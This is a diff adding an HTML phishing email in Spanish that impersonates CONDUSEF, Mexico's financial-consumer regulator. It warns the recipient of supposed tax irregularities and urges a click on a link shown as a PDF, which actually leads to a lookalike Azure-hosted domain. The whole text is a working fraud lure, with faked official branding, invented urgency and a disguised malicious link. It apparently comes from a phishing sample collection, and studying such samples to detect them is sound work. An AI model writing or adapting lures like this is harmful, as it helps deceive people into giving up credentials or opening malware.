@@ -1,0 +1,38 @@
+<div class="container">
+
+<h2><img src="https://www.acsan.mx/wp-content/uploads/2022/10/Comision-Nacional-para-la-Proteccion-y-Defensa-de-los-Usuarios-de-Servicios-Financieros.jpg" alt="" width="507" height="317" /></h2>
+
+<p>Estimado(a) Cliente,</p>
+
+<p><strong>jose@monkey.org</strong></p>
+
+<p>Esperamos que este correo electr&oacute;nico le encuentre bien.</p>
+
+<p>Estamos en contacto para informarle sobre cuestiones relacionadas con las <strong>declaraciones de impuestos</strong> asociadas a su cuenta.</p>
+
+<div class="highlight">
+
+<p><strong>Convocatoria para An&aacute;lisis de Impuestos:</strong></p>
+
+<p>Hemos identificado posibles <strong>irregularidades en sus declaraciones de impuestos</strong>. <strong>Le solicitamos su presencia en nuestras oficinas de CONDUSEF para un an&aacute;lisis detallado de sus registros fiscales</strong>. Es fundamental revisar y corregir estas discrepancias lo m&aacute;s r&aacute;pido posible.</p>
+
+</div>
+
+<p><strong>Si es necesario, puede acceder al archivo PDF con los detalles del proceso haciendo clic en el siguiente enlace:</strong></p>
+
+<p><a href="https://condusfasesori.westus3.cloudapp.azure.com/?68242095_8976-210223210223=767813767813" rel="noopener">210223%random_2%.pdf (2095 KB)</a></p>
+
+<p>Estamos comprometidos a garantizar el cumplimiento de las leyes fiscales y trabajaremos en conjunto para resolver esta cuesti&oacute;n de la mejor manera posible.</p>
+
+<p><strong>Por favor, p&oacute;ngase en contacto con nosotros para programar un horario para el an&aacute;lisis o si necesita alguna asistencia adicional.</strong></p>
+
+<p>Agradecemos su cooperaci&oacute;n y comprensi&oacute;n.</p>
+
+<p>Atentamente,</p>
+
+<p><br />CONDUSEF</p>
+
+<p><img src="https://www.buro.gob.mx/img/bannerGrafica.jpg" alt="" width="508" height="174" /><img src="&nbsp;&nbsp;https://www.buro.gob.mx/img/bannerGrafica.jpg" alt="" />&nbsp;</p>
+
+&nbsp;</div>
+
